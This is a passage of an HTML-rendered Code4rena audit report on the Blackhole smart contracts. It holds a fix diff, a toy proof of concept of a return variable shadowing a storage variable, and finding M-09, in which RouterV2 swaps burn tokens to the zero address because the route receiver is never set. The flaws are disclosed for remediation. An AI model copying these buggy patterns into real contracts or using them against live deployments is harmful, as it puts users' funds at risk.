class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    if (block.timestamp \u0026gt;= _periodFinish) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        rewardRate = reward / DURATION;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    } else {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 remaining = _periodFinish - block.timestamp;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        uint256 leftover = remaining * rewardRate;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        rewardRate = (reward + leftover) / DURATION;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    _periodFinish = block.timestamp + DURATION;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (IERC20Minimal rewardTokenAdd, IERC20Minimal bonusRewardTokenAdd, IAlgebraPool pool, uint256 nonce) =\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        algebraEternalFarming.incentiveKeys(poolAddress);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   incentivekey = IncentiveKey(rewardTokenAdd, bonusRewardTokenAdd, pool, nonce);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   IncentiveKey memory incentivekey = IncentiveKey(rewardTokenAdd, bonusRewardTokenAdd, pool, nonce);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    bytes32 incentiveId = IncentiveId.compute(incentivekey);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    (,, address virtualPoolAddress,,,) = algebraEternalFarming.incentives(incentiveId);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk8\"\u003e-   (,bonusRewardRate) = IAlgebraEternalVirtualPool(virtualPoolAddress).rewardRates();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   (,uint128 bonusRewardRate) = IAlgebraEternalVirtualPool(virtualPoolAddress).rewardRates();\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    rewardToken.safeTransferFrom(DISTRIBUTION, address(this), reward);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    IERC20(token).safeApprove(farmingParam.algebraEternalFarming, reward);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    algebraEternalFarming.addRewards(incentivekey, uint128(reward), 0);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    emit RewardAdded(reward);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk7\"\u003e+   return(incentivekey, rewardRate, bonusRewardRate);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003ch3 id=\"proof-of-concept-5\" style=\"position:relative;\"\u003e\u003ca href=\"#proof-of-concept-5\" aria-label=\"proof of concept 5 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eProof of Concept\u003c/h3\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"39\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk3\"\u003e// SPDX-License-Identifier: MIT\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003epragma\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003esolidity\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e ^\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0.8\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e.\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e27\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003econtract\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eShadowedStorageExample\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eincrementRewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) \u003c/span\u003e\u003cspan class=\"mtk11\"\u003epublic\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003ereturns\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e (\u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint256\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e) {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003erewardRate\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e += \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e}\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eNo matter how you call \u003ccode\u003eincrementRewardRate\u003c/code\u003e with different values, the storage variable \u003ccode\u003erewardRate\u003c/code\u003e will \u003cstrong\u003enever change\u003c/strong\u003e. This is because the function’s return variable \u003ccode\u003erewardRate\u003c/code\u003e shadows the contract’s storage variable of the same name.\u003c/p\u003e\n\u003cp\u003eAll updates inside the function only affect the local return variable, not the storage.\nAs a result, \u003ccode\u003erewardRate()\u003c/code\u003e (the public getter) will always return \u003ccode\u003e0\u003c/code\u003e, regardless of how many times you call the function or what arguments you provide.\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003e\u003ca href=\"https://github.com/code-423n4/2025-06-blackhole-mitigation?tab=readme-ov-file#mitigation-of-high--medium-severity-issues\"\u003eBlackhole mitigated\u003c/a\u003e\u003c/strong\u003e\u003c/p\u003e\n\u003cp\u003e\u003cstrong\u003eStatus:\u003c/strong\u003e Mitigation confirmed. Full details in reports from \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-19\"\u003elonelybones\u003c/a\u003e, \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-47\"\u003erayss\u003c/a\u003e and \u003ca href=\"https://code4rena.com/audits/2025-06-blackhole-mitigation-review/submissions/S-58\"\u003emaxvzuvex\u003c/a\u003e.\u003c/p\u003e\n\u003chr\u003e\n\u003chr\u003e\n\u003ch2 id=\"m-09-zero-receiver-fund-burn\" style=\"position:relative;\"\u003e\u003ca href=\"#m-09-zero-receiver-fund-burn\" aria-label=\"m 09 zero receiver fund burn permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003e\u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/F-188\"\u003e[M-09] Zero-receiver fund burn\u003c/a\u003e\u003c/h2\u003e\n\u003cp\u003e\u003cem\u003eSubmitted by \u003ca href=\"https://code4rena.com/audits/2025-05-blackhole/submissions/S-409\"\u003e0x15\u003c/a\u003e\u003c/em\u003e\u003c/p\u003e\n\u003cp\u003e\u003ca href=\"https://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L499-L530\"\u003ehttps://github.com/code-423n4/2025-05-blackhole/blob/92fff849d3b266e609e6d63478c4164d9f608e91/contracts/RouterV2.sol#L499-L530\u003c/a\u003e\u003c/p\u003e\n\u003ch3 id=\"finding-description-and-impact-1\" style=\"position:relative;\"\u003e\u003ca href=\"#finding-description-and-impact-1\" aria-label=\"finding description and impact 1 permalink\" class=\"anchor before\"\u003e\u003csvg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"\u003e\u003cpath fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"\u003e\u003c/path\u003e\u003c/svg\u003e\u003c/a\u003eFinding description and impact\u003c/h3\u003e\n\u003cp\u003eThe \u003ccode\u003eRouterV2\u003c/code\u003e implementation has a fundamental flaw where tokens are burned to the zero address instead of being sent to the intended recipient.\u003c/p\u003e\n\u003cp\u003eThe route struct includes a receiver field that defaults to \u003ccode\u003eaddress(0)\u003c/code\u003e when not explicitly set:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"40\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003estruct\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e {\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003epair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ebool\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eaddress\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e    }\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn the \u003ccode\u003e_swap\u003c/code\u003e function, both swap paths use \u003ccode\u003eroutes[i].receiver\u003c/code\u003e as the destination.\u003c/p\u003e\n\u003cp\u003eFor concentrated pools, it’s used as the recipient parameter:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"41\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003erecipient: \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eFor standard pools, it’s used in the swap call:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"42\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk11\"\u003eIBaseV1Pair\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk11\"\u003epairFor\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)).\u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswap\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                    \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount0Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamount1Out\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ei\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003ereceiver\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e, \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003ebytes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e)\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e                );\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eThe critical issue is in how routes are constructed.\u003c/p\u003e\n\u003cp\u003eIn \u003ccode\u003eswapExactTokensForTokensSimple\u003c/code\u003e routes are created with only \u003ccode\u003efrom\u003c/code\u003e, \u003ccode\u003eto\u003c/code\u003e, \u003ccode\u003estable\u003c/code\u003e, and \u003ccode\u003econcentrated\u003c/code\u003e fields set, but the receiver field is never populated:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"43\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ememory\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk4\"\u003enew\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk10\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[](\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e1\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e);\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003efrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenFrom\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003eto\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003etokenTo\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003estable\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[\u003c/span\u003e\u003cspan class=\"mtk7\"\u003e0\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e].\u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e = \u003c/span\u003e\u003cspan class=\"mtk12\"\u003econcentrated\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e;\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003c/code\u003e\u003c/pre\u003e\n\u003cp\u003eIn \u003ccode\u003eswapExactTokensForTokens\u003c/code\u003e routes are passed directly from users who build them without setting the receiver field:\u003c/p\u003e\n\u003cpre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"44\"\u003e\u003ccode class=\"grvsc-code\"\u003e\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk4\"\u003efunction\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk11\"\u003eswapExactTokensForTokens\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e(\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountIn\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003euint\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eamountOutMin\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan class=\"grvsc-line\"\u003e\u003cspan class=\"grvsc-source\"\u003e\u003cspan class=\"mtk1\"\u003e        \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroute\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e[] \u003c/span\u003e\u003cspan class=\"mtk12\"\u003ecalldata\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e \u003c/span\u003e\u003cspan class=\"mtk12\"\u003eroutes\u003c/span\u003e\u003cspan class=\"mtk1\"\u003e,\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\n\u003cspan 